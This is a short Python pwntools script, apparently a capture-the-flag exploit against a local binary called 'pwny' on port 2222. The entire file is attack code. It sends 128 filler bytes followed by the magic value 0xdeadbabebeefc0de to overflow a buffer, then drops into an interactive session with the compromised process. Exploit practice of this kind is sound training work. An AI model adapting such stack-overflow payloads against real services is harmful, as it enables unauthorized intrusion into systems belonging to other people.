#!/usr/bin/python

import struct
import sys

from pwn import *

context(arch='amd64', os='linux', endian='little', word_size=64)

binary_path = './pwny'

p = remote('localhost', 2222)
# p = process(binary_path)
# p = gdb.debug(['binary_path'])

payload = b''
payload += b'a' * 128
payload += p64(0xdeadbabebeefc0de)

p.readuntil('> ')
p.write(payload)
p.interactive()
